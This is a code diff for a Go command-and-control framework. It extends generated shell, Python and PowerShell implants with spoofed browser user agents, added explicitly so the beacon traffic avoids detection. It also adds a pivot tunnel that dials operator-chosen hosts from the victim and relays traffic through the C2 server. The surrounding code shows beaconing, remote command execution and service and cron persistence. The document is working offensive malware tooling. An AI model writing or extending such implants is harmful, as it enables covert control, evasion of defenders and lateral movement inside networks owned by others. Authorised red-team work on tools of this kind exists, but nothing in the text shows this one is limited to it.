@@ -10,6 +10,13 @@ import (
 // Implant version reported in beacons; bump when the protocol changes.
 const implantVersion = "1.0"
 
+// Check-in user agents. The stock curl/urllib/Invoke-WebRequest agents are
+// recognizable, so generated implants look like ordinary browser traffic.
+const (
+	uaLinux   = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
+	uaWindows = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
+)
+
 // implantFileName maps a runtime to its script filename.
 func implantFileName(runtime string) string {
 	switch runtime {
@@ -148,20 +155,58 @@ SLEEP={{SLEEP}}
 JIT={{JIT}}
 TMO={{TIMEOUT}}
 VER='{{VER}}'
+UA='{{UA}}'
 
 command -v curl >/dev/null 2>&1 || exit 1
 
 LOCK="${TMPDIR:-/tmp}/.atx-${ID}"
+TUNDIR="${TMPDIR:-/tmp}/.atx-${ID}-tun"
 HDRS=$(mktemp) || exit 1
 BODY=$(mktemp)
 OUT=$(mktemp)
-cleanup() { rmdir "$LOCK" 2>/dev/null; rm -f "$HDRS" "$BODY" "$OUT"; }
+cleanup() { : > "$TUNDIR/stop" 2>/dev/null; sleep 1; rm -rf "$TUNDIR"; rmdir "$LOCK" 2>/dev/null; rm -f "$HDRS" "$BODY" "$OUT"; }
 if mkdir "$LOCK" 2>/dev/null; then trap cleanup EXIT; else rm -f "$HDRS" "$BODY" "$OUT"; exit 0; fi
+mkdir -p "$TUNDIR" 2>/dev/null
 
 jesc() { printf '%s' "$1" | sed -e 's/\\/\\\\/g' -e 's/"/\\"/g' | tr -d '\n'; }
 jout() { sed -e 's/\\/\\\\/g' -e 's/"/\\"/g' | awk '{printf "%s\\n", $0}'; }
 sha() { if command -v sha256sum >/dev/null 2>&1; then sha256sum; else shasum -a 256; fi; }
 b64() { base64 | tr -d '\n'; }
+b64d() { base64 -d 2>/dev/null || base64 -D 2>/dev/null; }
+TMOBIN=''
+command -v timeout >/dev/null 2>&1 && TMOBIN=timeout
+[ -z "$TMOBIN" ] && command -v gtimeout >/dev/null 2>&1 && TMOBIN=gtimeout
+# tunecho/tunread move bytes without blocking the beacon loop. Where GNU
+# timeout exists it bounds the copy; otherwise (stock macOS) dd runs
+# backgrounded and is killed once the first chunk lands or ~1s passes.
+tunecho() {
+  local p i
+  if [ -n "$TMOBIN" ]; then
+    "$TMOBIN" 1 dd bs=16384 count=1 <&4 >&3 2>/dev/null
+    return
+  fi
+  dd bs=16384 count=1 <&4 >&3 2>/dev/null & p=$!
+  for i in 1 2 3 4 5 6; do
+    sleep 0.05
+    kill -0 "$p" 2>/dev/null || break
+  done
+  kill "$p" 2>/dev/null
+  wait "$p" 2>/dev/null
+}
+tunread() {
+  local p i
+  if [ -n "$TMOBIN" ]; then
+    "$TMOBIN" 1 dd bs=8192 count=1 <&3 2>/dev/null
+    return
+  fi
+  dd bs=8192 count=1 <&3 2>/dev/null & p=$!
+  for i in 1 2 3 4 5 6; do
+    sleep 0.05
+    kill -0 "$p" 2>/dev/null || break
+  done
+  kill "$p" 2>/dev/null
+  wait "$p" 2>/dev/null
+}
 
 # post URL  (raw JSON on stdin): encodes, stores body/headers, echoes status.
 post() {
@@ -178,17 +223,99 @@ post() {
     body=$(printf '%s' "$raw" | b64)
     args=(-H "X-Request-ID: $TOK" -H "X-Artex-Enc: none")
   fi
-  curl -sS -m 45 -o "$BODY" -D "$HDRS" -w '%{http_code}' -X POST "${args[@]}" --data-binary "$body" "$url" 2>/dev/null
+  curl -sS -m 45 -o "$BODY" -D "$HDRS" -w '%{http_code}' -A "$UA" -X POST "${args[@]}" --data-binary "$body" "$url" 2>/dev/null
 }
 
 hget() { awk -v k="$1" 'tolower($1)==k{print $2}' "$HDRS" | tr -d '\r' | head -1; }
 
 pause() {
   local j d
+  # A live tunnel needs a short cycle so relayed traffic keeps moving.
+  case "$(ls -d "$TUNDIR"/*/*/ 2>/dev/null)" in ''|"$TUNDIR"/*/*/) : ;; esac
+  if [ -n "$(ls -d "$TUNDIR"/*/*/ 2>/dev/null)" ]; then sleep 1; return; fi
   j=$(( SLEEP * JIT / 100 ))
   d=$(( SLEEP - j + (RANDOM % (2*j+1)) ))
   [ "$d" -lt 1 ] && d=1
   sleep "$d"
+}
+
+# ---- implant pivot tunnel -------------------------------------------------
+# Frames: <tun>|<conn>|<op>|<b64> with op open|data|close. Downlink arrives as
+# cmd=tunnel; uplink is posted to the normal result path with task_id "tun".
+# Each connection gets a FIFO so the worker thread never blocks the beacon
+# loop, and nothing but FIFOs/tokens touches disk.
+tunq() { printf '%s\n' "$1" >> "$TUNDIR/up"; }
+tunlock() { until mkdir "$TUNDIR/.lk" 2>/dev/null; do sleep 0.02; done; }
+tununlock() { rmdir "$TUNDIR/.lk" 2>/dev/null; }
+
+# tun_worker tun conn host port dir — one background relay per connection.
+tun_worker() {
+  local t=$1 c=$2 host=$3 port=$4 d=$5 out
+  exec 3<>"/dev/tcp/$host/$port" 2>/dev/null || { tunq "$t|$c|close|"; rm -rf "$d"; return; }
+  exec 4<>"$d/in"
+  tunq "$t|$c|open|"
+  while [ ! -e "$d/stop" ] && [ ! -e "$TUNDIR/stop" ]; do
+    tunecho
+    out=$(tunread | b64)
+    if [ -n "$out" ]; then tunq "$t|$c|data|$out"; else sleep 0.2; fi
+  done
+  exec 3<&- 4<&-
+  tunq "$t|$c|close|"
+  rm -rf "$d"
+}
+
+tun_open() { # tun conn b64target
+  local d="$TUNDIR/$1/$2" hp host port
+  hp=$(printf '%s' "$3" | b64d)
+  host=${hp%:*}
+  port=${hp##*:}
+  mkdir -p "$d"
+  mkfifo "$d/in" 2>/dev/null
+  # Probe the dial first: exec redirection failure exits a subshell, so the
+  # probe catches it and the beacon loop stays in control.
+  ( exec 3<>"/dev/tcp/$host/$port" ) 2>/dev/null || { tunq "$1|$2|close|"; rm -rf "$d"; return; }
+  ( tun_worker "$1" "$2" "$host" "$port" "$d" ) >/dev/null 2>&1 &
+}
+
+tun_data() { # tun conn b64payload
+  local d="$TUNDIR/$1/$2"
+  [ -p "$d/in" ] || return 0
+  if [ -n "$TMOBIN" ]; then
+    printf '%s' "$3" | b64d | "$TMOBIN" 5 dd of="$d/in" bs=16384 2>/dev/null
+  else
+    printf '%s' "$3" | b64d | dd of="$d/in" bs=16384 2>/dev/null
+  fi
+}
+
+tun_close() { local d="$TUNDIR/$1/$2"; [ -d "$d" ] && : > "$d/stop"; }
+
+# tun_flush — post buffered uplink frames in batches the body limit tolerates.
+tun_flush() {
+  local lines line n=0 batch=''
+  [ -s "$TUNDIR/up" ] || return 0
+  tunlock
+  lines=$(cat "$TUNDIR/up" 2>/dev/null)
+  : > "$TUNDIR/up"
+  tununlock
+  [ -n "$lines" ] || return 0
+  while IFS= read -r line; do
+    [ -n "$line" ] || continue
+    batch="${batch}${line}
+"
+    n=$((n+1))
+    if [ "$n" -ge 16 ]; then tunpost "$batch"; batch=''; n=0; fi
+  done <<EOF
+$lines
+EOF
+  [ -n "$batch" ] && tunpost "$batch"
+  return 0
+}
+
+tunpost() { # newline-separated raw frames
+  local out res
+  out=$(printf '%s' "$1" | b64)
+  res=$(printf '{"id":"%s","task_id":"tun","output":"%s","exit":0}' "$ID" "$out")
+  printf '%s' "$res" | post "$BASE/api/c2/$RPATH" >/dev/null
 }
 
 while :; do
@@ -198,10 +325,27 @@ while :; do
     "$([ "$(id -u 2>/dev/null)" = 0 ] && echo true || echo false)" \
     "$(jesc "$(pwd)")" "$VER")
   code=$(printf '%s' "$json" | post "$BASE/api/c2/$BPATH")
-  if [ "$code" != 200 ]; then pause; continue; fi
+  if [ "$code" != 200 ]; then tun_flush; pause; continue; fi
   tid=$(hget x-task-id:)
-  case "$tid" in ''|*[!0-9]*) pause; continue ;; esac
+  case "$tid" in ''|*[!0-9]*) tun_flush; pause; continue ;; esac
   cmd=$(hget x-task-cmd:)
+  if [ "$cmd" = tunnel ]; then
+    fr=$(hget x-task-args: | b64d)
+    tun=${fr%%|*}
+    r1=${fr#*|}
+    cid=${r1%%|*}
+    r2=${r1#*|}
+    op=${r2%%|*}
+    data=${r2#*|}
+    case "$op" in
+      open)  tun_open "$tun" "$cid" "$data" ;;
+      data)  tun_data "$tun" "$cid" "$data" ;;
+      close) tun_close "$tun" "$cid" ;;
+    esac
+    tun_flush
+    pause
+    continue
+  fi
   if [ "$cmd" = kill ]; then
     systemctl disable --now "sysupd-${ID}.service" >/dev/null 2>&1
     crontab -l 2>/dev/null | grep -v "atx-${ID}" | crontab - 2>/dev/null
@@ -220,6 +364,7 @@ while :; do
   res=$(printf '{"id":"%s","task_id":"%s","output":"%s","exit":%s}' \
     "$ID" "$tid" "$(head -c 60000 "$OUT" | jout)" "$rc")
   printf '%s' "$res" | post "$BASE/api/c2/$RPATH" >/dev/null
+  tun_flush
   pause
 done
 `
@@ -235,6 +380,7 @@ done
 		"{{JIT}}", fmt.Sprint(im.JitterPct),
 		"{{TIMEOUT}}", fmt.Sprint(defaultTimeout),
 		"{{VER}}", implantVersion,
+		"{{UA}}", uaLinux,
 	)
 	return rep.Replace(script)
 }
@@ -249,7 +395,7 @@ func pythonImplant(im *Implant) string {
 	script := `#!/usr/bin/env python3
 # ARTEX agent helper {{ID}} ({{LABEL}})
 # Keep private: the file embeds the beacon token.
-import base64, json, os, random, socket, subprocess, sys, time, urllib.request
+import base64, json, os, random, socket, subprocess, sys, threading, time, urllib.request
 
 BASE = "{{BASE}}"
 ID = "{{ID}}"
@@ -260,11 +406,13 @@ SLEEP = {{SLEEP}}
 JIT = {{JIT}}
 TMO = {{TIMEOUT}}
 VER = "{{VER}}"
+UA = "{{UA}}"
 
 def post(url, obj, timeout=45):
     body = base64.b64encode(json.dumps(obj).encode())
     req = urllib.request.Request(url, data=body, method="POST")
     req.add_header("Content-Type", "application/octet-stream")
+    req.add_header("User-Agent", UA)
     req.add_header("X-Request-ID", TOK)
     req.add_header("X-Artex-Enc", "none")
     with urllib.request.urlopen(req, timeout=timeout) as r:
@@ -277,6 +425,86 @@ def post(url, obj, timeout=45):
         except Exception:
             return headers, None
     return headers, None
+
+# ---- implant pivot tunnel --------------------------------------------------
+# Frames: <tun>|<conn>|<op>|<b64> with op open|data|close. Downlink arrives as
+# cmd=tunnel; uplink is posted to the normal result path with task_id "tun".
+TUN_LOCK = threading.Lock()
+TUN_CONNS = {}  # (tun, conn) -> {"sock": socket}
+TUN_OUT = []    # pending uplink frame strings
+
+def tunq(line):
+    with TUN_LOCK:
+        TUN_OUT.append(line)
+
+def tun_open(tid, cid, target):
+    host, _, port = target.rpartition(":")
+    try:
+        s = socket.create_connection((host, int(port)), timeout=10)
+    except Exception:
+        tunq("%s|%s|close|" % (tid, cid))
+        return
+    with TUN_LOCK:
+        TUN_CONNS[(tid, cid)] = {"sock": s}
+    tunq("%s|%s|open|" % (tid, cid))
+    threading.Thread(target=tun_reader, args=(tid, cid), daemon=True).start()
+
+def tun_reader(tid, cid):
+    with TUN_LOCK:
+        st = TUN_CONNS.get((tid, cid))
+    if st is None:
+        return
+    try:
+        while True:
+            with TUN_LOCK:
+                if (tid, cid) not in TUN_CONNS:
+                    return
+            data = st["sock"].recv(16384)
+            if not data:
+                break
+            tunq("%s|%s|data|%s" % (tid, cid, base64.b64encode(data).decode()))
+    except Exception:
+        pass
+    tun_close(tid, cid)
+
+def tun_data(tid, cid, payload):
+    with TUN_LOCK:
+        st = TUN_CONNS.get((tid, cid))
+    if st is None:
+        return
+    try:
+        st["sock"].sendall(payload)
+    except Exception:
+        tun_close(tid, cid)
+
+def tun_close(tid, cid):
+    with TUN_LOCK:
+        st = TUN_CONNS.pop((tid, cid), None)
+    if st is not None:
+        try:
+            st["sock"].close()
+        except Exception:
+            pass
+        tunq("%s|%s|close|" % (tid, cid))
+
+def tun_active():
+    with TUN_LOCK:
+        return bool(TUN_CONNS)
+
+def tun_flush():
+    with TUN_LOCK:
+        if not TUN_OUT:
+            return
+        batch = TUN_OUT[:16]
+        del TUN_OUT[:16]
+    res = {"id": ID, "task_id": "tun",
+           "output": base64.b64encode(("\n".join(batch) + "\n").encode()).decode(),
+           "exit": 0}
+    try:
+        post(BASE + "/api/c2/" + RPATH, res)
+    except Exception:
+        with TUN_LOCK:
+            TUN_OUT[0:0] = batch  # retry on the next cycle
 
 def loop():
     while True:
@@ -309,6 +537,23 @@ def loop():
             except ValueError:
                 tmo = TMO
             args = base64.b64decode(args64).decode("utf-8", "replace") if args64 else ""
+            if cmd == "tunnel":
+                # <tun>|<conn>|<op>|<b64payload>
+                try:
+                    tun_, cid, op, data = args.split("|", 3)
+                    payload = base64.b64decode(data) if data else b""
+                except Exception:
+                    payload = None
+                    tun_, cid, op = "", "", ""
+                if op == "open":
+                    tun_open(tun_, cid, payload.decode("utf-8", "replace"))
+                elif op == "data" and payload is not None:
+                    tun_data(tun_, cid, payload)
+                elif op == "close":
+                    tun_close(tun_, cid)
+                tun_flush()
+                time.sleep(0.3)
+                continue
             res = {"id": ID, "task_id": tid, "output": "", "exit": 0}
             if args:
                 try:
@@ -322,6 +567,10 @@ def loop():
                 except Exception as exc:
                     res["error"] = str(exc)[:2000]
             post(BASE + "/api/c2/" + RPATH, res)
+        tun_flush()
+        if tun_active():
+            time.sleep(0.3)  # short cycle while a tunnel has open connections
+            continue
         jitter = SLEEP * JIT // 100
         time.sleep(max(1, SLEEP - jitter + random.randint(0, 2 * jitter)))
 
@@ -342,6 +591,7 @@ if __name__ == "__main__":
 		"{{JIT}}", fmt.Sprint(im.JitterPct),
 		"{{TIMEOUT}}", fmt.Sprint(defaultTimeout),
 		"{{VER}}", implantVersion,
+		"{{UA}}", uaLinux,
 	)
 	return rep.Replace(script)
 }
@@ -365,6 +615,7 @@ $Sleep = {{SLEEP}}
 $Jit = {{JIT}}
 $Tmo = {{TIMEOUT}}
 $Ver = "{{VER}}"
+$UA = "{{UA}}"
 
 $Key = [System.Text.Encoding]::UTF8.GetBytes(("artex-c2:" + $Tok))
 $Sha = [System.Security.Cryptography.SHA256]::Create()
@@ -400,11 +651,86 @@ function ConvertFrom-Encoded([string]$Body, [string]$EncIn, [string]$IVHex) {
 }
 
 function Post-Json([string]$Url, [string]$Json, [int]$TimeoutSec) {
+
     $p = ConvertTo-Encoded $Json
-    $headers = @{ "X-Request-ID" = $Tok; "X-Artex-Enc" = $p.Enc }
+    $headers = @{ "X-Request-ID" = $Tok; "X-Artex-Enc" = $p.Enc; "User-Agent" = $UA }
     if ($p.IV) { $headers["X-IV"] = $p.IV }
     $resp = Invoke-WebRequest -Uri $Url -Method Post -Headers $headers -ContentType "application/octet-stream" -Body $p.Body -TimeoutSec $TimeoutSec -UseBasicParsing
     return $resp
+}
+
+# ---- implant pivot tunnel --------------------------------------------------
+# Frames: <tun>|<conn>|<op>|<b64> with op open|data|close. Downlink arrives as
+# cmd=tunnel; uplink is posted to the normal result path with task_id "tun".
+# PowerShell has no cheap threads, so relays are polled from the beacon loop.
+$script:Conn = @{}
+$script:Q = New-Object System.Collections.ArrayList
+$script:NL = [string][char]10
+
+function B64d([string]$S) { [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($S)) }
+
+function TunOpen([string]$Tun, [string]$Cid, [string]$B64Target) {
+    $hp = B64d $B64Target
+    $i = $hp.LastIndexOf(":")
+    if ($i -lt 1) { [void]$script:Q.Add("$Tun|$Cid|close|"); return }
+    try {
+        $c = New-Object System.Net.Sockets.TcpClient
+        $c.Connect($hp.Substring(0, $i), [int]$hp.Substring($i + 1))
+    } catch {
+        [void]$script:Q.Add("$Tun|$Cid|close|")
+        return
+    }
+    $script:Conn["$Tun|$Cid"] = $c
+    [void]$script:Q.Add("$Tun|$Cid|open|")
+}
+
+function TunData([string]$Tun, [string]$Cid, [string]$B64) {
+    $c = $script:Conn["$Tun|$Cid"]
+    if ($null -eq $c) { return }
+    try {
+        $b = [Convert]::FromBase64String($B64)
+        $s = $c.GetStream()
+        $s.Write($b, 0, $b.Length)
+        $s.Flush()
+    } catch { TunClose $Tun $Cid }
+}
+
+function TunClose([string]$Tun, [string]$Cid) {
+    $k = "$Tun|$Cid"
+    $c = $script:Conn[$k]
+    if ($null -ne $c) {
+        [void]$script:Conn.Remove($k)
+        try { $c.Close() } catch {}
+        [void]$script:Q.Add("$Tun|$Cid|close|")
+    }
+}
+
+function TunPump {
+    foreach ($k in @($script:Conn.Keys)) {
+        $c = $script:Conn[$k]
+        $pp = $k.Split("|")
+        try {
+            $s = $c.GetStream()
+            while ($s.DataAvailable) {
+                $buf = New-Object byte[] 16384
+                $n = $s.Read($buf, 0, $buf.Length)
+                if ($n -le 0) { TunClose $pp[0] $pp[1]; break }
+                [void]$script:Q.Add(("{0}|{1}|data|{2}" -f $pp[0], $pp[1], [Convert]::ToBase64String($buf, 0, $n)))
+            }
+        } catch { TunClose $pp[0] $pp[1] }
+    }
+}
+
+function TunFlush {
+    if ($script:Q.Count -eq 0) { return }
+    $n = [Math]::Min(16, $script:Q.Count)
+    $batch = @($script:Q.GetRange(0, $n))
+    $script:Q.RemoveRange(0, $n)
+    $out = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((($batch -join $script:NL) + $script:NL)))
+    $res = @{ id = $ID; task_id = "tun"; output = $out; exit = 0 } | ConvertTo-Json -Compress
+    try { Post-Json ($Base + "/api/c2/" + $RPath) $res 20 | Out-Null } catch {
+        $script:Q.InsertRange(0, $batch)
+    }
 }
 
 $host2 = $env:COMPUTERNAME
@@ -433,6 +759,19 @@ while ($true) {
             if ([int]::TryParse([string]($resp.Headers["X-Task-Timeout"][0]), [ref]$try)) { $tmoTask = $try }
         }
         $taskArgs = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($args64))
+        if ($cmd -eq "tunnel") {
+            $pp = $taskArgs.Split("|", 4)
+            if ($pp.Length -eq 4) {
+                switch ($pp[2]) {
+                    "open" { TunOpen $pp[0] $pp[1] $pp[3] }
+                    "data" { TunData $pp[0] $pp[1] $pp[3] }
+                    "close" { TunClose $pp[0] $pp[1] }
+                }
+            }
+            TunFlush
+            Start-Sleep -Milliseconds 300
+            continue
+        }
         $out = ""
         $rc = 0
         try {
@@ -446,6 +785,9 @@ while ($true) {
         $result = @{ id = $ID; task_id = $tid; output = $out; exit = $rc } | ConvertTo-Json -Compress
         try { Post-Json ($Base + "/api/c2/" + $RPath) $result 45 | Out-Null } catch {}
     }
+    TunPump
+    TunFlush
+    if ($script:Conn.Count -gt 0) { Start-Sleep -Milliseconds 300; continue }
     $j = $Sleep * $Jit / 100
     Start-Sleep -Seconds (Get-Random -Minimum ([int][Math]::Max(1, $Sleep - $j)) -Maximum ([int][Math]::Max(2, $Sleep + $j + 1)))
 }
@@ -462,6 +804,7 @@ while ($true) {
 		"{{JIT}}", fmt.Sprint(im.JitterPct),
 		"{{TIMEOUT}}", fmt.Sprint(defaultTimeout),
 		"{{VER}}", implantVersion,
+		"{{UA}}", uaWindows,
 	)
 	return rep.Replace(script)
 }
